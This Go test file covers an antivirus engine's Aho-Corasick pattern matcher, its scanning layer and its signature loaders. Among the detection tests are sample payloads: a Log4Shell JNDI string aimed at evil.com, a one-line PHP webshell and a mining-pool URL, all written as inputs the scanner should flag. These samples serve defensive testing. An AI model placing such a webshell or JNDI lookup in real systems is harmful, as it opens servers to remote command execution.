package matcher

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus"
)

// ─────────────────────────────────────────────────────────────────────────────
// Aho-Corasick Core Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestAC_SinglePattern(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "Test.One", Pattern: []byte("malware"), Confidence: 0.9})
	ac := b.Build()

	matches := ac.Search([]byte("this file contains malware inside"))
	if len(matches) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matches))
	}
	if matches[0].Signature.Name != "Test.One" {
		t.Errorf("wrong name: %s", matches[0].Signature.Name)
	}
	if matches[0].StartOffset() != 19 {
		t.Errorf("expected start offset 19, got %d", matches[0].StartOffset())
	}
}

func TestAC_MultiplePatterns(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "Pat.A", Pattern: []byte("abc")})
	b.AddPattern(SignatureInfo{ID: "t2", Name: "Pat.B", Pattern: []byte("xyz")})
	b.AddPattern(SignatureInfo{ID: "t3", Name: "Pat.C", Pattern: []byte("def")})
	ac := b.Build()

	matches := ac.Search([]byte("abcdefxyz"))
	if len(matches) != 3 {
		t.Fatalf("expected 3 matches, got %d", len(matches))
	}
}

func TestAC_OverlappingPatterns(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "Short", Pattern: []byte("he")})
	b.AddPattern(SignatureInfo{ID: "t2", Name: "Long", Pattern: []byte("her")})
	b.AddPattern(SignatureInfo{ID: "t3", Name: "Longest", Pattern: []byte("hers")})
	ac := b.Build()

	matches := ac.Search([]byte("hers"))
	ids := make(map[string]bool)
	for _, m := range matches {
		ids[m.Signature.ID] = true
	}
	for _, expected := range []string{"t1", "t2", "t3"} {
		if !ids[expected] {
			t.Errorf("missing match for %s", expected)
		}
	}
}

func TestAC_RepeatedPattern(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "AA", Pattern: []byte("aa")})
	ac := b.Build()

	matches := ac.Search([]byte("aaaa"))
	if len(matches) != 3 { // positions 0-1, 1-2, 2-3
		t.Errorf("expected 3 matches in 'aaaa', got %d", len(matches))
	}
}

func TestAC_NoMatch(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "X", Pattern: []byte("xyz")})
	ac := b.Build()

	matches := ac.Search([]byte("abcdefgh"))
	if len(matches) != 0 {
		t.Errorf("expected 0 matches, got %d", len(matches))
	}
}

func TestAC_EmptyInput(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "X", Pattern: []byte("test")})
	ac := b.Build()

	matches := ac.Search([]byte{})
	if len(matches) != 0 {
		t.Errorf("expected 0 matches on empty input, got %d", len(matches))
	}
}

func TestAC_EmptyAutomaton(t *testing.T) {
	ac := NewBuilder().Build()
	matches := ac.Search([]byte("anything"))
	if matches != nil {
		t.Errorf("expected nil matches from empty automaton, got %d", len(matches))
	}
}

func TestAC_BinaryPatterns(t *testing.T) {
	b := NewBuilder()
	pattern := []byte{0x4d, 0x5a, 0x90, 0x00} // PE header
	b.AddPattern(SignatureInfo{ID: "pe", Name: "PE.Header", Pattern: pattern})
	ac := b.Build()

	input := append([]byte("junk"), pattern...)
	input = append(input, []byte("more junk")...)

	matches := ac.Search(input)
	if len(matches) != 1 {
		t.Fatalf("expected 1 binary match, got %d", len(matches))
	}
	if matches[0].StartOffset() != 4 {
		t.Errorf("expected offset 4, got %d", matches[0].StartOffset())
	}
}

func TestAC_SearchFirst(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "A", Pattern: []byte("aaa")})
	b.AddPattern(SignatureInfo{ID: "t2", Name: "B", Pattern: []byte("bbb")})
	ac := b.Build()

	m := ac.SearchFirst([]byte("xxxaaaxbbb"))
	if m == nil {
		t.Fatal("expected a match")
	}
	if m.Signature.Name != "A" {
		t.Errorf("expected first match to be A, got %s", m.Signature.Name)
	}

	m2 := ac.SearchFirst([]byte("no match here"))
	if m2 != nil {
		t.Error("expected nil for no match")
	}
}

func TestAC_FailureLinks(t *testing.T) {
	// Classic AC test case: "abcab" with patterns "abc", "cab"
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "ABC", Pattern: []byte("abc")})
	b.AddPattern(SignatureInfo{ID: "t2", Name: "CAB", Pattern: []byte("cab")})
	ac := b.Build()

	matches := ac.Search([]byte("cabcab"))
	ids := make(map[string]bool)
	for _, m := range matches {
		ids[m.Signature.ID] = true
	}
	if !ids["t1"] || !ids["t2"] {
		t.Errorf("failure links broken — expected both patterns, got %v", ids)
	}
}

func TestAC_Stats(t *testing.T) {
	b := NewBuilder()
	for i := 0; i < 100; i++ {
		b.AddPattern(SignatureInfo{
			ID: fmt.Sprintf("t%d", i), Name: fmt.Sprintf("P%d", i),
			Pattern: []byte(fmt.Sprintf("pattern_%d_data", i)),
		})
	}
	ac := b.Build()
	stats := ac.Stats()
	if stats.PatternCount != 100 {
		t.Errorf("expected 100 patterns, got %d", stats.PatternCount)
	}
	if !stats.Compiled {
		t.Error("expected compiled=true")
	}
	if stats.NodeCount < 100 {
		t.Errorf("expected > 100 nodes, got %d", stats.NodeCount)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Layer Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestLayer_Name(t *testing.T) {
	l := NewLayer(nil)
	if l.Name() != "pattern" {
		t.Errorf("expected 'pattern', got %q", l.Name())
	}
}

func TestLayer_Scan_Clean(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "Evil", Pattern: []byte("malware_bytes")})
	l := NewLayer(b.Build())

	threats, err := l.Scan(&antivirus.ScanTarget{
		Content: []byte("safe content here"), Filename: "safe.txt",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(threats) != 0 {
		t.Errorf("expected no threats, got %d", len(threats))
	}
}

func TestLayer_Scan_Detection(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{
		ID: "t1", Name: "Trojan.Test", Pattern: []byte("evil_payload"),
		Category: antivirus.CategoryTrojan, Severity: antivirus.SeverityHigh,
		Confidence: 0.90,
	})
	l := NewLayer(b.Build())

	threats, err := l.Scan(&antivirus.ScanTarget{
		Content: []byte("some data evil_payload more data"), Filename: "bad.exe",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(threats) != 1 {
		t.Fatalf("expected 1 threat, got %d", len(threats))
	}
	if threats[0].Name != "Trojan.Test" {
		t.Errorf("wrong name: %s", threats[0].Name)
	}
	if threats[0].Layer != antivirus.LayerPattern {
		t.Errorf("wrong layer: %s", threats[0].Layer)
	}
	if threats[0].Confidence != 0.90 {
		t.Errorf("wrong confidence: %f", threats[0].Confidence)
	}
}

func TestLayer_Scan_Deduplication(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "Dup", Pattern: []byte("aa")})
	l := NewLayer(b.Build())

	threats, _ := l.Scan(&antivirus.ScanTarget{
		Content: []byte("aaaa"), Filename: "dup.bin",
	})
	// "aa" matches at 3 positions, but dedup should yield 1 threat.
	if len(threats) != 1 {
		t.Errorf("expected 1 deduplicated threat, got %d", len(threats))
	}
}

func TestLayer_Scan_EmptyContent(t *testing.T) {
	l := NewLayer(NewBuilder().Build())
	threats, err := l.Scan(&antivirus.ScanTarget{Content: nil})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(threats) != 0 {
		t.Errorf("expected 0 threats, got %d", len(threats))
	}
}

func TestLayer_Reload(t *testing.T) {
	b1 := NewBuilder()
	b1.AddPattern(SignatureInfo{ID: "old", Name: "Old.Sig", Pattern: []byte("oldpattern")})
	l := NewLayer(b1.Build())

	b2 := NewBuilder()
	b2.AddPattern(SignatureInfo{ID: "new", Name: "New.Sig", Pattern: []byte("newpattern")})
	l.Reload(b2.Build())

	threats, _ := l.Scan(&antivirus.ScanTarget{
		Content: []byte("newpattern"), Filename: "test",
	})
	if len(threats) != 1 || threats[0].Name != "New.Sig" {
		t.Error("reload did not take effect")
	}
}

func TestLayer_ConcurrentScans(t *testing.T) {
	b := NewBuilder()
	b.AddPattern(SignatureInfo{ID: "t1", Name: "C", Pattern: []byte("concurrent_test")})
	l := NewLayer(b.Build())

	var wg sync.WaitGroup
	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < 100; j++ {
				l.Scan(&antivirus.ScanTarget{
					Content: []byte("data concurrent_test data"), Filename: "c.bin",
				})
			}
		}()
	}
	wg.Wait()

	stats := l.Stats()
	if stats.TotalScans != 5000 {
		t.Errorf("expected 5000 scans, got %d", stats.TotalScans)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in Patterns Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestBuiltinPatterns_Register(t *testing.T) {
	b := NewBuilder()
	count := RegisterBuiltinPatterns(b)
	if count == 0 {
		t.Fatal("no builtin patterns registered")
	}
	if count != BuiltinPatternCount() {
		t.Errorf("expected %d, registered %d", BuiltinPatternCount(), count)
	}
	ac := b.Build()
	stats := ac.Stats()
	if stats.PatternCount != count {
		t.Errorf("automaton has %d patterns, expected %d", stats.PatternCount, count)
	}
}

func TestBuiltinPatterns_EICAR(t *testing.T) {
	b := NewBuilder()
	RegisterBuiltinPatterns(b)
	ac := b.Build()

	// Standard EICAR test string.
	eicar := `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`
	matches := ac.Search([]byte(eicar))
	found := false
	for _, m := range matches {
		if m.Signature.Name == "EICAR-Test-File" {
			found = true
			break
		}
	}
	if !found {
		t.Error("EICAR test file not detected by builtin patterns")
	}
}

func TestBuiltinPatterns_Log4Shell(t *testing.T) {
	b := NewBuilder()
	RegisterBuiltinPatterns(b)
	ac := b.Build()

	payload := []byte(`{"user": "${jndi:ldap://evil.com/a}"}`)
	matches := ac.Search(payload)
	found := false
	for _, m := range matches {
		if strings.Contains(m.Signature.Name, "Log4Shell") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Log4Shell payload not detected")
	}
}

func TestBuiltinPatterns_Stratum(t *testing.T) {
	b := NewBuilder()
	RegisterBuiltinPatterns(b)
	ac := b.Build()

	payload := []byte(`config.pool = "stratum+tcp://pool.minexmr.com:4444"`)
	m := ac.SearchFirst(payload)
	if m == nil {
		t.Fatal("stratum mining protocol not detected")
	}
	if m.Signature.Category != antivirus.CategoryCryptominer {
		t.Errorf("expected cryptominer category, got %s", m.Signature.Category)
	}
}

func TestBuiltinPatterns_Webshell(t *testing.T) {
	b := NewBuilder()
	RegisterBuiltinPatterns(b)
	ac := b.Build()

	php := []byte(`<?php system($_GET['cmd']); ?>`)
	m := ac.SearchFirst(php)
	if m == nil {
		t.Fatal("PHP webshell not detected")
	}
	if m.Signature.Category != antivirus.CategoryWebshell {
		t.Errorf("expected webshell category, got %s", m.Signature.Category)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Signature Loader Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestLoadNDB_Valid(t *testing.T) {
	b := NewBuilder()
	hexPayload := hex.EncodeToString([]byte("malware_payload_test"))
	content := fmt.Sprintf("Trojan.Test.1:0:*:%s\nRansom.Test.2:1:0:%s\n",
		hexPayload, hexPayload)

	loaded, err := LoadNDB(b, strings.NewReader(content), "test.ndb")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if loaded != 2 {
		t.Errorf("expected 2 loaded, got %d", loaded)
	}
}

func TestLoadNDB_SkipsWildcards(t *testing.T) {
	b := NewBuilder()
	content := "Sig.Wild:0:*:4d5a??00\nSig.Alt:0:*:4d5a{2}00\n"
	loaded, _ := LoadNDB(b, strings.NewReader(content), "test.ndb")
	if loaded != 0 {
		t.Errorf("wildcard sigs should be skipped, got %d", loaded)
	}
}

func TestLoadNDB_SkipsTooShort(t *testing.T) {
	b := NewBuilder()
	content := "Sig.Short:0:*:4d5a\n" // only 2 bytes
	loaded, _ := LoadNDB(b, strings.NewReader(content), "test.ndb")
	if loaded != 0 {
		t.Errorf("short patterns should be skipped, got %d", loaded)
	}
}

func TestLoadJSON_Valid(t *testing.T) {
	b := NewBuilder()
	hexP := hex.EncodeToString([]byte("json_test_pattern"))
	content := fmt.Sprintf(`[{"id":"j1","name":"JSON.Test","hexPattern":"%s","category":"trojan"}]`, hexP)
	loaded, err := LoadJSON(b, strings.NewReader(content), "test.json")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if loaded != 1 {
		t.Errorf("expected 1, got %d", loaded)
	}
}

func TestLoadFromDir_Mixed(t *testing.T) {
	dir := t.TempDir()
	hexP := hex.EncodeToString([]byte("dir_test_pattern_ab"))

	os.WriteFile(filepath.Join(dir, "test.ndb"),
		[]byte(fmt.Sprintf("Dir.NDB:0:*:%s\n", hexP)), 0644)
	os.WriteFile(filepath.Join(dir, "test.json"),
		[]byte(fmt.Sprintf(`[{"id":"d1","name":"Dir.JSON","hexPattern":"%s"}]`, hexP)), 0644)

	b := NewBuilder()
	loaded, errs := LoadFromDir(b, dir)
	if len(errs) > 0 {
		t.Errorf("unexpected errors: %v", errs)
	}
	if loaded != 2 {
		t.Errorf("expected 2 loaded, got %d", loaded)
	}
}

func TestLoadFromDir_NonExistent(t *testing.T) {
	b := NewBuilder()
	loaded, errs := LoadFromDir(b, "/nonexistent/dir")
	if len(errs) != 0 || loaded != 0 {
		t.Errorf("non-existent dir should return 0,nil — got %d, %v", loaded, errs)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Helper Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestInferCategory(t *testing.T) {
	tests := map[string]antivirus.ThreatCategory{
		"Trojan.Win32.X":   antivirus.CategoryTrojan,
		"Ransom.WannaCry":  antivirus.CategoryRansomware,
		"Exploit.CVE2021":  antivirus.CategoryExploit,
		"CoinMiner.XMRig":  antivirus.CategoryCryptominer,
		"Unknown.Generic":  antivirus.CategoryGeneric,
	}
	for name, want := range tests {
		if got := inferCategory(name); got != want {
			t.Errorf("inferCategory(%q) = %s, want %s", name, got, want)
		}
	}
}

func TestInferSeverity(t *testing.T) {
	if inferSeverity(antivirus.CategoryRansomware) != antivirus.SeverityCritical {
		t.Error("ransomware should be critical")
	}
	if inferSeverity(antivirus.CategoryAdware) != antivirus.SeverityLow {
		t.Error("adware should be low")
	}
}

func TestContainsWildcard(t *testing.T) {
	if !containsWildcard("4d5a??00") {
		t.Error("should detect ?? wildcard")
	}
	if !containsWildcard("4d5a{2}00") {
		t.Error("should detect {} wildcard")
	}
	if containsWildcard("4d5a9000") {
		t.Error("clean hex should not be wildcard")
	}
}
